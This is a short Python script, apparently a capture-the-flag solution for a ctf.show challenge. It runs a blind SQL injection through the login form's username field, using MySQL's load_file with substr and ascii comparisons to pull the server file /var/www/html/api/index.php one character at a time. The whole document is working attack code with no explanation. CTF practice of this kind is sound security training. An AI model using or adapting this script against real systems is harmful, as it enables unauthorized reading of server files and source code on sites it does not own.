# author:yu22x
import requests
import string

url = "http://3608ddfb-87ff-446a-8395-b54bf2572083.challenge.ctf.show//api/index.php"
s = string.printable
flag = ''
for i in range(1, 1000):
    # print(i)
    for j in range(32, 128):
        # print(chr(j))
        data = {'username': f"if(ascii(substr(load_file('/var/www/html/api/index.php'),{i},1))={j},1,0)",
                'password': '1'}
        # print(data)
        r = requests.post(url, data=data)
        print(r.text)
        if "\\u67e5\\u8be2\\u5931\\u8d25" in r.text:
            flag += chr(j)
            print(flag)
            break
